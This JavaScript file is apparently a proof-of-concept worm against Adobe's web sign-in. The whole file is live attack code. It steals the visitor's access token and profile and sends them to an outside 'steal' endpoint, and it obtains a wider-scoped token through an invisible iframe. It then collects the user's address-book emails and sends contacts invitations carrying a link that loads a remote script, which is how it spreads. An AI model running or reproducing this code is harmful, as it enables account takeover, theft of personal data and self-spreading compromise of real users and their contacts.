const EXFIL    = 'https://nboyhu0n.instances.poc.jchunt.top/steal';
const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--aem';
const AB_HOST  = 'https://ab.adobe-identity.com';
const INV_HOST = 'https://invitations.adobe.io';
const API_KEY_AB  = 'CCHomeWeb1';
const API_KEY_INV = 'projectx_webapp';

async function waitForIMS(maxMs = 8000) {
  const deadline = Date.now() + maxMs;
  while (Date.now() < deadline) {
    if (window.adobeIMS?.getAccessToken?.()) return window.adobeIMS.getAccessToken().token;
    await new Promise(r => setTimeout(r, 300));
  }
  return null;
}

function decodeJWT(token) {
  try {
    const parts = token.split('.');
    return JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
  } catch { return {}; }
}

async function stage1() {
  const token = await waitForIMS(8000);
  if (!token) return;

  const payload = decodeJWT(token);
  navigator.sendBeacon(`${EXFIL}?src=token&client=${payload.client_id}`, token);

  try {
    const p = await fetch('https://ims-na1.adobelogin.com/ims/profile/v1?client_id=adobedotcom-cc', {
      headers: { 'Authorization': `Bearer ${token}` }
    }).then(r => r.json());
    navigator.sendBeacon(`${EXFIL}?src=profile`, JSON.stringify(p));
  } catch {}

  if (payload.scope?.includes('ab.manage')) {
    await wormSpread(token);
    return;
  }

  try {
    const ccToken = await new Promise((resolve, reject) => {
      const iframe = document.createElement('iframe');
      iframe.style.cssText = 'position:absolute;width:0;height:0;border:0;opacity:0;pointer-events:none';
      iframe.src = 'https://ims-na1.adobelogin.com/ims/authorize/v2'
        + '?client_id=CCHomeWeb1&response_type=token&prompt=none'
        + '&redirect_uri=' + encodeURIComponent('https://www.adobe.com/')
        + '&scope=AdobeID,ab.manage,creative_sdk,openid';
      const timeout = setTimeout(() => reject('timeout'), 15000);
      const poll = setInterval(() => {
        try {
          const t = iframe.contentWindow?.adobeIMS?.getAccessToken?.();
          if (t?.token) { clearInterval(poll); clearTimeout(timeout); resolve(t.token); }
        } catch {}
      }, 500);
      document.body.appendChild(iframe);
    });
    navigator.sendBeacon(`${EXFIL}?src=cc_token`, ccToken);
    await wormSpread(ccToken);
  } catch {}
}

async function wormSpread(token) {
  let emails = [];
  try {
    const abResp = await fetch(`${AB_HOST}/api/address-books?limit=50`, {
      headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY_AB }
    });
    if (abResp.ok) {
      const books = (await abResp.json())?._embedded?.addressBooks || [];
      for (const book of books) {
        const cResp = await fetch(`${AB_HOST}/api/address-books/${book.ident}/contacts?limit=100`, {
          headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY_AB }
        });
        if (cResp.ok) {
          const contacts = (await cResp.json())?._embedded?.contacts || [];
          for (const c of contacts) if (c?.email) emails.push(c.email);
        }
      }
    }
  } catch {}

  navigator.sendBeacon(`${EXFIL}?src=contacts`, JSON.stringify(emails));
  if (!emails.length) return;

  const urn = 'urn:aaid:sc:US:15fee5cd-d42e-4e13-88e1-9832f2bdafd9';

  for (const email of emails.slice(0, 50)) {
    try {
      const resp = await fetch(`${INV_HOST}/api/v4/share/${encodeURIComponent(urn)}?mode=direct_acl`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'X-Api-Key': API_KEY_INV,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          recipients: [{ recipient: `mailto:${email}`, role: 'editor', canComment: true, canShare: false }],
          notification: {
            email: { sharing: { locale: 'en-US', templateName: 'cc_collab_express_document_edit_invite_notification' } },
            parameters: { message: '', targetUrl: WORM_URL }
          },
          configuration: {}
        })
      });
      navigator.sendBeacon(`${EXFIL}?src=inv&to=${encodeURIComponent(email)}`, await resp.text());
    } catch {}
  }
}

stage1();
